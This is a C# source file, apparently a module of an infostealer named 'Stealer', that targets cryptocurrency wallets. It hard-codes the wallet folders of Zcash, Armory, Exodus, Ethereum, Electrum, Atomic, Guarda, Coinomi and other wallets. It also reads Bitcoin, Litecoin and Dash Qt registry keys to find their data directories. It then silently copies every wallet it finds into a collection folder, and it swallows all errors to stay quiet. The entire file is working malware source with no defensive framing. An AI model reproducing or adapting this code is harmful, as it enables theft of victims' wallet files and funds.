using System;
using System.Collections.Generic;
using System.IO;
using Microsoft.Win32;
using Stealer.Steal.Helper;

namespace Stealer.Steal.Target.Crypto;

internal class Crypto
{
	private static readonly List<string[]> SWalletsDirectories = new List<string[]>
	{
		new string[2]
		{
			"Zcash",
			Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Zcash"
		},
		new string[2]
		{
			"Armory",
			Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Armory"
		},
		new string[2]
		{
			"Bytecoin",
			Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\bytecoin"
		},
		new string[2]
		{
			"Jaxx",
			Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\com.liberty.jaxx\\IndexedDB\\file__0.indexeddb.leveldb"
		},
		new string[2]
		{
			"Exodus",
			Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Exodus\\exodus.wallet"
		},
		new string[2]
		{
			"Ethereum",
			Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Ethereum\\keystore"
		},
		new string[2]
		{
			"Electrum",
			Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Electrum\\wallets"
		},
		new string[2]
		{
			"AtomicWallet",
			Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\atomic\\Local Storage\\leveldb"
		},
		new string[2]
		{
			"Guarda",
			Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Guarda\\Local Storage\\leveldb"
		},
		new string[2]
		{
			"Coinomi",
			Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Coinomi\\Coinomi\\wallets"
		}
	};

	private static readonly string[] SWalletsRegistry = new string[3] { "Litecoin", "Dash", "Bitcoin" };

	public static void Start()
	{
		try
		{
			foreach (string[] sWalletsDirectory in SWalletsDirectories)
			{
				CopyWalletFromDirectoryTo(sWalletsDirectory[1], sWalletsDirectory[0]);
			}
			string[] sWalletsRegistry = SWalletsRegistry;
			for (int i = 0; i < sWalletsRegistry.Length; i++)
			{
				CopyWalletFromRegistryTo(sWalletsRegistry[i]);
			}
		}
		catch
		{
		}
	}

	private static void CopyWalletFromDirectoryTo(string sWalletDir, string sWalletName)
	{
		if (Directory.Exists(sWalletDir))
		{
			string virtualDir = Path.Combine("Wallets", sWalletName);
			DynamicFiles.CopyDirectory(sWalletDir, virtualDir);
		}
	}

	private static void CopyWalletFromRegistryTo(string sWalletRegistry)
	{
		string virtualDir = Path.Combine("Wallets", sWalletRegistry);
		try
		{
			using RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software")?.OpenSubKey(sWalletRegistry)?.OpenSubKey(sWalletRegistry + "-Qt");
			if (registryKey != null)
			{
				string text = registryKey.GetValue("strDataDir")?.ToString() + "\\wallets";
				if (Directory.Exists(text))
				{
					DynamicFiles.CopyDirectory(text, virtualDir);
				}
			}
		}
		catch (Exception)
		{
		}
	}
}
